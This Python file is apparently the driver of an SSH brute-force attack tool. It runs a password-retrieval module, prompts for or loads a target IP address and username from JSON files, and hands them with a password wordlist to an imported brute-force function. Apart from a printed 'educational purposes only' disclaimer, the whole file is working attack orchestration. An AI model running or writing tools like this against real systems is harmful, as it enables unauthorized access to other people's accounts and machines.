import app.findmy_password as findmy_password
import app.ssh_script as ssh_script
import json
import os

def perform_attack():
    # Disclaimer
    print("WARNING: This script is intended for educational purposes only. Unauthorized access to computer systems is illegal and unethical.")
    print("Only run this script on testing environments where you have explicit permission to perform security testing.")
    print()
    
    # invoking the findmy_password function to retrieve the password
    findmy_password.finder()
    print("password retrieval complete.\n")
    print("proceeding with SSH brute-force attack...\n")
    print()
    print("initializing attack...")
    
    # file directory
    base_dir = os.path.dirname(__file__)  # directory of app/__init__.py
    targetIP = os.path.join(base_dir, "target_ip.json")
    
    # getting and verifying target IP
    with open(targetIP, "r") as ipAddress_key:
        target_ip = json.load(ipAddress_key)

    verify_ip = "target_ip"
    if verify_ip in target_ip and target_ip[verify_ip] == "":
        target_address = input("No target IP found. Please enter the target IP address:  \n")
        target_ip[verify_ip] = target_address.strip()
        print(target_address)
        print("ip address file has been updated")
        
    # file directory
    base_dir = os.path.dirname(__file__)  # directory of app/__init__.py
    targetUser = os.path.join(base_dir, "username.json")
    
    # getting and verifying username
    with open(targetUser, "r") as username_key:
        target_user = json.load(username_key)

    verify_user = "username"
    if verify_user in target_user and target_user[verify_user] == "":
        target_userName = input("No username found. Please enter target username: \n")
        target_user[verify_user] = target_userName.strip()
        print(target_userName)
        print("username file has been updated")
    
    # updating file
    with open(targetIP, "w") as ipAddress_key:
        json.dump(target_ip, ipAddress_key, indent=4)
        print(target_ip["target_ip"])
    
    # updating file
    with open(targetUser, "w") as username_key:
        json.dump(target_user, username_key, indent=4)
        print(target_user["username"])
        
    # file directory
    base_dir = os.path.dirname(__file__)  # directory of app/__init__.py
    password_File = os.path.join(base_dir, 'passwords.txt')
    
    TARGETIP = target_ip["target_ip"]
    TARGETUSER = target_user["username"]
    password_document = password_File
    
    ssh_script.ssh_brute_force(TARGETIP, TARGETUSER, password_document)
    
